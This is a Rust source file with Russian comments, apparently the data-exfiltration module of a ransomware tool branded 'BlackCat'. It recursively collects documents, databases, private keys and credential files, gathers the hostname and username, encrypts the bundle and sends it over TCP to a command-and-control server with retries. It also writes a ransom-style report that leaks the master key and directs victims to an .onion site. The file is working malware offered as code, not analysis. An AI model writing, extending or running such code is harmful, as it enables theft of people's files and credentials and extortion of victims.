// src/exfiltration.rs
use std::fs;
use std::path::Path;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use log::{info, warn};
use crate::crypto::CryptoEngine;

pub struct Exfiltration;

impl Exfiltration {
    // Собираем чувствительные данные из указанного пути
    pub fn collect_sensitive_data_from_path(target_path: &str) -> Vec<(String, Vec<u8>)> {
        let mut collected = Vec::new();
        
        // Всегда сканируем указанный пользователем путь
        if Path::new(target_path).exists() {
            Self::collect_from_path(target_path, &mut collected);
        }
        
        info!("Collected {} sensitive files from {}", collected.len(), target_path);
        collected
    }
    
    fn collect_from_path(base_path: &str, collected: &mut Vec<(String, Vec<u8>)>) {
        let extensions = Self::get_sensitive_extensions();
        
        if let Ok(entries) = fs::read_dir(base_path) {
            for entry in entries.flatten() {
                let path = entry.path();
                
                if path.is_dir() {
                    // Рекурсивный обход поддиректорий
                    if let Some(path_str) = path.to_str() {
                        if !Self::should_skip_directory(&path) {
                            Self::collect_from_path(path_str, collected);
                        }
                    }
                } else if path.is_file() {
                    // Проверяем расширение файла
                    if let Some(ext) = path.extension() {
                        let ext_str = ext.to_string_lossy().to_lowercase();
                        if extensions.iter().any(|e| ext_str == *e) {
                            // Проверяем размер файла (не больше 10MB)
                            if let Ok(metadata) = fs::metadata(&path) {
                                if metadata.len() <= 10 * 1024 * 1024 {
                                    // Читаем файл
                                    if let Ok(mut file) = fs::File::open(&path) {
                                        let mut buffer = Vec::new();
                                        if file.read_to_end(&mut buffer).is_ok() {
                                            if let Some(path_str) = path.to_str() {
                                                collected.push((path_str.to_string(), buffer));
                                                info!("Collected: {}", path_str);
                                            }
                                        }
                                    }
                                } else {
                                    warn!("File too large to exfiltrate: {}", path.display());
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    fn should_skip_directory(path: &Path) -> bool {
        // Пропускаем системные директории
        let path_str = path.to_string_lossy().to_lowercase();
        path_str.contains("windows\\system32") ||
        path_str.contains("program files") ||
        path_str.contains("programdata") ||
        path_str.contains("appdata\\local\\temp")
    }
    
    fn get_sensitive_extensions() -> Vec<String> {
        vec![
            "txt", "doc", "docx", "xls", "xlsx", "pdf", 
            "jpg", "jpeg", "png", "config", "ini", "xml",
            "sql", "db", "mdb", "pass", "cred", "key",
            "pem", "ppk", "csv", "rtf", "odt", "ods",
        ].iter().map(|s| s.to_string()).collect()
    }
    
    // Улучшенная отправка данных на C2 с реконнектами
    pub fn send_to_c2(data: &[u8], c2_address: &str, port: u16) -> Result<(), String> {
        let address = format!("{}:{}", c2_address, port);
        
        // Пробуем несколько раз подключиться
        for attempt in 1..=3 {
            match TcpStream::connect_timeout(
                &address.parse().map_err(|e| format!("Invalid address: {}", e))?,
                Duration::from_secs(3)
            ) {
                Ok(mut stream) => {
                    // Устанавливаем таймауты
                    stream.set_write_timeout(Some(Duration::from_secs(10))).ok();
                    
                    // Отправляем сигнатуру BlackCat
                    let signature = b"BLACKCAT_EXFIL_v1.0";
                    if let Err(e) = stream.write_all(signature) {
                        warn!("Failed to send signature: {}", e);
                        continue;
                    }
                    
                    // Отправляем размер данных
                    let size = data.len() as u32;
                    if let Err(e) = stream.write_all(&size.to_be_bytes()) {
                        warn!("Failed to send size: {}", e);
                        continue;
                    }
                    
                    // Отправляем данные чанками
                    let chunk_size = 8192;
                    let mut bytes_sent = 0;
                    
                    while bytes_sent < data.len() {
                        let end = std::cmp::min(bytes_sent + chunk_size, data.len());
                        let chunk = &data[bytes_sent..end];
                        
                        if let Err(e) = stream.write_all(chunk) {
                            warn!("Failed to send chunk: {}", e);
                            break;
                        }
                        
                        bytes_sent = end;
                    }
                    
                    if bytes_sent == data.len() {
                        info!("Successfully exfiltrated {} bytes to {}", data.len(), address);
                        return Ok(());
                    } else {
                        warn!("Partial send: {}/{} bytes", bytes_sent, data.len());
                    }
                }
                Err(e) => {
                    warn!("Connection attempt {} failed: {}", attempt, e);
                    if attempt < 3 {
                        std::thread::sleep(Duration::from_secs(2));
                    }
                }
            }
        }
        
        Err(format!("Failed to connect to C2 after 3 attempts: {}", address))
    }
    
    // Основная функция эксфильтрации
    pub fn exfiltrate(target_path: &str, c2_address: &str, port: u16, crypto_engine: &CryptoEngine) -> Result<(), String> {
        info!("Starting data exfiltration from {} to {}:{}", target_path, c2_address, port);
        
        // 1. Собираем данные
        let sensitive_data = Self::collect_sensitive_data_from_path(target_path);
        if sensitive_data.is_empty() {
            warn!("No sensitive data found in {}", target_path);
            return Ok(());
        }
        
        // 2. Упаковываем в структурированный формат
        let mut package = Vec::new();
        
        // Добавляем заголовок с версией
        package.extend_from_slice(b"BLACKCAT_EXFIL_v1.0");
        
        // Добавляем информацию о системе
        let system_info = Self::get_system_info();
        let info_bytes = system_info.as_bytes();
        let info_len = info_bytes.len() as u32;
        package.extend_from_slice(&info_len.to_be_bytes());
        package.extend_from_slice(info_bytes);
        
        // Добавляем количество файлов
        let file_count = sensitive_data.len() as u32;
        package.extend_from_slice(&file_count.to_be_bytes());
        
        // Добавляем каждый файл
        for (path, data) in sensitive_data {
            // Путь как UTF-8
            let path_bytes = path.as_bytes();
            let path_len = path_bytes.len() as u32;
            package.extend_from_slice(&path_len.to_be_bytes());
            package.extend_from_slice(path_bytes);
            
            // Размер файла
            let file_size = data.len() as u64;
            package.extend_from_slice(&file_size.to_be_bytes());
            
            // Данные файла
            package.extend_from_slice(&data);
            
            // Разделитель между файлами
            package.extend_from_slice(b"---FILE_END---");
        }
        
        // 3. Шифруем перед отправкой
        info!("Encrypting {} bytes of exfiltration data", package.len());
        let encrypted = crypto_engine.encrypt_aes_256(&package)
            .map_err(|e| format!("Failed to encrypt exfiltration data: {}", e))?;
        
        // 4. Отправляем на C2 сервер
        info!("Sending encrypted data to C2 server...");
        Self::send_to_c2(&encrypted, c2_address, port)?;
        
        info!("Exfiltration completed successfully from {}", target_path);
        Ok(())
    }
    
    pub fn exfiltrate_from_c2(c2_address: &str, port: u16, crypto_engine: &CryptoEngine) -> Result<(), String> {
        // Для команды Exfiltrate без указания пути - собираем из стандартных мест
        Self::exfiltrate(".", c2_address, port, crypto_engine)
    }
    
    fn get_system_info() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::process::Command;
            
            let hostname = Command::new("hostname")
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_else(|_| "unknown".to_string());
            
            let username = std::env::var("USERNAME")
                .unwrap_or_else(|_| "unknown".to_string());
            
            format!("Windows - Host: {}, User: {}", hostname, username)
        }
        
        #[cfg(target_os = "linux")]
        {
            use std::process::Command;
            
            let hostname = Command::new("hostname")
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_else(|_| "unknown".to_string());
            
            let username = Command::new("whoami")
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_else(|_| "unknown".to_string());
            
            format!("Linux - Host: {}, User: {}", hostname, username)
        }
        
        #[cfg(not(any(target_os = "windows", target_os = "linux")))]
        {
            "Unknown system".to_string()
        }
    }
    
    // Создание файла с информацией об эксфильтрации
    pub fn create_exfiltration_report(target_path: &str, all_dirs_list: &str, crypto_engine: &CryptoEngine) -> String {
        let mut report = String::new();
        
        report.push_str("=== BLACKCAT DATA EXFILTRATION REPORT ===\n\n");
        report.push_str(&format!("Target Path: {}\n", target_path));
        report.push_str(&format!("System: {}\n\n", Self::get_system_info()));
        
        report.push_str("Sensitive data has been exfiltrated, including:\n");
        for ext in Self::get_sensitive_extensions() {
            report.push_str(&format!("- .{} files\n", ext));
        }
        
        report.push_str("\nDirectories affected:\n");
        report.push_str(all_dirs_list);
        
        report.push_str("\n\n=== DECRYPTION INFORMATION ===\n");
        report.push_str("Master Key (AES-256-GCM): ");
        let master_key_hex = hex::encode(crypto_engine.get_master_key());
        report.push_str(&master_key_hex);
        
        report.push_str("\n\nTo recover your files:\n");
        report.push_str("1. Visit: http://blackcat-site.onion/\n");
        report.push_str("2. Enter your unique ID: ");
        report.push_str(&master_key_hex[0..16]);
        report.push_str("\n3. Follow the instructions\n\n");
        
        report.push_str("=== END REPORT ===\n");
        
        report
    }
    
    // Функция для создания тестовых файлов (для демонстрации)
    pub fn create_test_files(path: &str) -> Result<(), String> {
        let test_files = vec![
            ("test_document.docx", "This is a test Word document with sensitive information."),
            ("financial_report.xlsx", "Q1 2024 Financial Report\nRevenue: $1,234,567\nProfit: $345,678"),
            ("confidential.pdf", "CONFIDENTIAL\nProject Alpha Details\nBudget: $500,000\nTeam: 15 members"),
            ("passwords.txt", "Admin: P@ssw0rd123\nDatabase: DBpass!2024\nSSH: ssh_key_rsa"),
            ("database_backup.sql", "CREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(100));"),
            ("config.ini", "[Database]\nhost=localhost\nuser=admin\npassword=secret123"),
        ];
        
        let test_dir = Path::new(path);
        if !test_dir.exists() {
            fs::create_dir_all(test_dir)
                .map_err(|e| format!("Failed to create test directory: {}", e))?;
        }
        
        for (filename, content) in test_files {
            let file_path = test_dir.join(filename);
            fs::write(&file_path, content)
                .map_err(|e| format!("Failed to create test file {}: {}", filename, e))?;
        }
        
        info!("Created test files in {}", path);
        Ok(())
    }
}